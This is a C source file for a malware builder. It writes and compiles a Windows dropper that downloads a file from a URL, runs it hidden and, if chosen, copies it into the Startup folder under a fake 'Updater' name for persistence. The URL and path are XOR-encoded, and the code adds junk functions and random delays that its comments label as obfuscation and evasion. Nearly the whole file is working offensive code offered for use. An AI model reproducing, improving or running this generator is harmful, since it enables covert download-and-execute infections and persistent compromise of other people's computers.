#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

#define XOR_KEY 0xAA // XOR encryption key

// Fake functions and junk loops for obfuscation
void fake_function_1() {
    int i = 0;
    for (int j = 0; j < 1000; j++) {
        i += j;
    }
}

void fake_function_2() {
    int x = 1, y = 1;
    for (int i = 0; i < 5000; i++) {
        x = x + y;
        y = x - y;
    }
}

// XOR encryption for obfuscating the URL and Path
void xor_encrypt(char* data, int length) {
    for (int i = 0; i < length; i++) {
        data[i] ^= XOR_KEY;
    }
}

// Function to simulate random delay (for evasion)
void simulate_delay() {
    Sleep(rand() % 3000 + 1000);
}

void generate_random_string(char* buffer, int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for (int i = 0; i < length; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        buffer[i] = charset[key];
    }
    buffer[length] = '\0';
}

int main() {
    srand(time(NULL)); // Random seed

    char url[512];
    char save_path[512];
    char filename_option[10];
    char persistence_option[10];
    char random_filename[20];
    char output_name[100];

    // Fake functions for obfuscation
    fake_function_1();
    fake_function_2();

    printf("Enter URL to download from (or leave blank for default): ");
    fgets(url, sizeof(url), stdin);
    url[strcspn(url, "\n")] = 0;

    if (strlen(url) == 0) {
        strcpy(url, "http://ipv4.download.thinkbroadband.com/5MB.zip"); // Default fallback
    }

    printf("Enter Save Path (or leave blank for Temp path): ");
    fgets(save_path, sizeof(save_path), stdin);
    save_path[strcspn(save_path, "\n")] = 0;

    if (strlen(save_path) == 0) {
        strcpy(save_path, "C:\\\\Windows\\\\Temp\\\\downloaded.exe");
    }

    printf("Randomize Startup Filename? (yes/no): ");
    fgets(filename_option, sizeof(filename_option), stdin);
    filename_option[strcspn(filename_option, "\n")] = 0;

    printf("Add Persistence to Startup? (yes/no): ");
    fgets(persistence_option, sizeof(persistence_option), stdin);
    persistence_option[strcspn(persistence_option, "\n")] = 0;

    printf("Enter output filename (without .exe): ");
    fgets(output_name, sizeof(output_name), stdin);
    output_name[strcspn(output_name, "\n")] = 0;
    if (strlen(output_name) == 0) {
        strcpy(output_name, "dropper");
    }

    if (strcmp(filename_option, "yes") == 0) {
        generate_random_string(random_filename, 10);
    } else {
        strcpy(random_filename, "Updater");
    }

    // XOR encrypt URL and path
    xor_encrypt(url, strlen(url));
    xor_encrypt(save_path, strlen(save_path));

    FILE *fp = fopen("dropper.c", "w");
    if (fp == NULL) {
        printf("Error creating dropper.\n");
        return 1;
    }

    // Write obfuscated dropper source
    fprintf(fp,
        "#include <windows.h>\n"
        "#include <urlmon.h>\n"
        "#pragma comment(lib, \"urlmon.lib\")\n"
        "#include <stdio.h>\n"
        "int main() {\n"
        "    Sleep(%d);\n",
        (rand() % 3000) + 1000 // Random delay between 1-4 seconds
    );

    // Reversing XOR encryption (decrypting URL and Path)
    fprintf(fp,
        "    char url[512] = \"%s\";\n"
        "    char save_path[512] = \"%s\";\n"
        "    for (int i = 0; i < strlen(url); i++) {\n"
        "        url[i] ^= 0xAA;\n"
        "    }\n"
        "    for (int i = 0; i < strlen(save_path); i++) {\n"
        "        save_path[i] ^= 0xAA;\n"
        "    }\n",
        url, save_path
    );

    // Actual download and execute
    fprintf(fp,
        "    HRESULT hr = URLDownloadToFileA(NULL, url, save_path, 0, NULL);\n"
        "    if (SUCCEEDED(hr)) {\n"
        "        ShellExecuteA(NULL, \"open\", save_path, NULL, NULL, SW_HIDE);\n"
        "    }\n"
    );

    // Add persistence if selected
    if (strcmp(persistence_option, "yes") == 0) {
        fprintf(fp,
            "    Sleep(%d);\n"
            "    char startup_path[MAX_PATH];\n"
            "    GetEnvironmentVariableA(\"APPDATA\", startup_path, MAX_PATH);\n"
            "    strcat(startup_path, \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%s.exe\");\n"
            "    CopyFileA(save_path, startup_path, FALSE);\n",
            (rand() % 10000) + 5000, // Random delay 5–15 sec before persistence
            random_filename
        );
    }

    fprintf(fp, "\n    return 0;\n}\n");

    fclose(fp);

    printf("\nDropper source created: 'dropper.c'.\n");

    // Compile the dropper immediately
    char compile_command[200];
    sprintf(compile_command, "gcc dropper.c -o %s.exe -lurlmon", output_name);

    printf("\nCompiling dropper.c... Please wait...\n");
    int compile_result = system(compile_command);
    if (compile_result == 0) {
        printf("Dropper compiled successfully: '%s.exe'.\n", output_name);
    } else {
        printf("Compilation failed.\n");
    }

    return 0;
}